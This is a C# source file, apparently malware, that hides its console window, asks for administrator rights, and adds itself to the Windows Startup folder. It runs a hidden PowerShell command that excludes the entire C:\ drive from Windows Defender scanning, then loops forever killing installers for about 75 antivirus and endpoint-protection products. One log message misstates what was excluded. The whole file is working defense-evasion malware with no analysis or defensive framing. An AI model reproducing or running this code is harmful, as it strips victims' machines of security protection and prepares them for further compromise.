using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Net;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;

    static void Main(string[] args)
    {
        if (!IsAdmin())
        {
            RequestAdminPrivileges();
            return;
        }

        IntPtr consoleWindow = GetConsoleWindow();
        ShowWindow(consoleWindow, SW_HIDE);
        CreateShortcutInStartup();
        AddExclusionsToWindowsDefender();

        while (true)
        {
            SearchAndKillProcess("MBSetup.exe");
            SearchAndKillProcess("avg_free_antivirus_setup.exe");
            SearchAndKillProcess("avast_internet_security_setup.exe");
            SearchAndKillProcess("MCAFEE_INSTALLER.exe");
            SearchAndKillProcess("MCPR.exe");
            SearchAndKillProcess("Setup.exe");
            SearchAndKillProcess("kis21.0.1.235de-1G.exe");
            SearchAndKillProcess("bitdefender_online.exe");
            SearchAndKillProcess("NSDownloader.exe");
            SearchAndKillProcess("avast_free_antivirus_setup_online.exe");
            SearchAndKillProcess("avast.exe");
            SearchAndKillProcess("AVG.exe");
            SearchAndKillProcess("McAfee.exe");
            SearchAndKillProcess("AhnLab-V3.exe");
            SearchAndKillProcess("AlibabaSetup.msi");
            SearchAndKillProcess("AviraNoCloudInstaller.exe");
            SearchAndKillProcess("BaiduProtection.exe");
            SearchAndKillProcess("ClamAVInstaller.exe");
            SearchAndKillProcess("CMCSetup.exe");
            SearchAndKillProcess("CybereasonProtection.msi");
            SearchAndKillProcess("DrWebSetup.exe");
            SearchAndKillProcess("ESET-NOD32Installer.exe");
            SearchAndKillProcess("GridinsoftNoCloudSetup.exe");
            SearchAndKillProcess("IkarusProtection.exe");
            SearchAndKillProcess("JiangminInstaller.msi");
            SearchAndKillProcess("K7AntiVirusSetup.exe");
            SearchAndKillProcess("K7GWInstaller.exe");
            SearchAndKillProcess("NANO-AntivirusSetup.exe");
            SearchAndKillProcess("PaloAltoNetworksInstaller.msi");
            SearchAndKillProcess("QuickHealSetup.exe");
            SearchAndKillProcess("SUPERAntiSpywareInstaller.exe");
            SearchAndKillProcess("TACHYONSetup.exe");
            SearchAndKillProcess("TEHTRISInstaller.msi");
            SearchAndKillProcess("TencentProtection.exe");
            SearchAndKillProcess("VBA32Setup.exe");
            SearchAndKillProcess("VirITInstaller.msi");
            SearchAndKillProcess("ViRobotSetup.exe");
            SearchAndKillProcess("WebrootInstaller.exe");
            SearchAndKillProcess("WithSecureSetup.msi");
            SearchAndKillProcess("XcitiumInstaller.exe");
            SearchAndKillProcess("YandexProtectionSetup.exe");
            SearchAndKillProcess("ZillyaInstaller.msi");
            SearchAndKillProcess("ZonerSetup.exe");
            SearchAndKillProcess("AvastMobileInstaller.apk");
            SearchAndKillProcess("TrendMicro-HouseCall.exe");
            SearchAndKillProcess("VIPRESetup.exe");
            SearchAndKillProcess("VaristInstaller.msi");
            SearchAndKillProcess("TrendMicroInstaller.exe");
            SearchAndKillProcess("TrellixFireEyeSetup.exe");
            SearchAndKillProcess("SymantecSetup.exe");
            SearchAndKillProcess("SophosInstaller.exe");
            SearchAndKillProcess("SkyhighSWGSetup.exe");
            SearchAndKillProcess("SentinelOneStaticMLInstaller.exe");
            SearchAndKillProcess("SecureAgeSetup.exe");
            SearchAndKillProcess("SangforEngineZeroInstaller.msi");
            SearchAndKillProcess("RisingSetup.exe");
            SearchAndKillProcess("PandaInstaller.exe");
            SearchAndKillProcess("MaxSecureSetup.exe");
            SearchAndKillProcess("MAXInstaller.exe");
            SearchAndKillProcess("LionicSetup.exe");
            SearchAndKillProcess("KingsoftInstaller.exe");
            SearchAndKillProcess("GDataSetup.exe");
            SearchAndKillProcess("eScanInstaller.exe");
            SearchAndKillProcess("EmsisoftSetup.exe");
            SearchAndKillProcess("ElasticInstaller.exe");
            SearchAndKillProcess("DeepInstinctSetup.exe");
            SearchAndKillProcess("CynetInstaller.msi");
            SearchAndKillProcess("CylanceSetup.exe");
            SearchAndKillProcess("CrowdStrikeFalconSetup.exe");
            SearchAndKillProcess("BkavProInstaller.exe");
            SearchAndKillProcess("BitDefenderThetaSetup.exe");
            SearchAndKillProcess("BitDefenderInstaller.exe");
            SearchAndKillProcess("Antiy-AVLSetup.exe");
            SearchAndKillProcess("ArcabitInstaller.exe");
            SearchAndKillProcess("ALYacSetup.exe");
        }
    }

    static void SearchAndKillProcess(string processName)
    {
        Process[] processes = Process.GetProcesses();
        foreach (Process process in processes)
        {
            try
            {
                if (process.MainModule.FileName.EndsWith(processName, StringComparison.OrdinalIgnoreCase))
                {
                    process.Kill();
                    Console.WriteLine($"Process associated with {processName} killed successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unable to kill process associated with {processName}. Error: {ex.Message}");
            }
        }
    }

    static void RequestAdminPrivileges()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.Verb = "runas";
        startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
        try
        {
            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while requesting admin privileges: {ex.Message}");
        }
    }

    static bool IsAdmin()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    static void CreateShortcutInStartup()
    {
        string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string shortcutPath = Path.Combine(startupFolderPath, "ProgramShortcut.lnk");

        if (!File.Exists(shortcutPath))
        {
            object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
            var shortcut = shell.GetType().InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, shell, new object[] { shortcutPath });
            shortcut.GetType().InvokeMember("TargetPath", System.Reflection.BindingFlags.SetProperty, null, shortcut, new object[] { Process.GetCurrentProcess().MainModule.FileName });
            shortcut.GetType().InvokeMember("Save", System.Reflection.BindingFlags.InvokeMethod, null, shortcut, null);
            Console.WriteLine("Shortcut created in Startup folder.");
        }
        else
        {
            Console.WriteLine("Shortcut already exists in Startup folder.");
        }
    }

    static void AddExclusionsToWindowsDefender()
    {
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "powershell.exe";
        startInfo.Arguments = $"-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\\'";
        startInfo.Verb = "runas";
        startInfo.CreateNoWindow = true;
        startInfo.UseShellExecute = false;
        process.StartInfo = startInfo;
        process.Start();
        Console.WriteLine("Program directory, AppData directory, Startup directory, program path, System32 directory, and System64 directory added to Windows Defender exclusions.");
    }
}
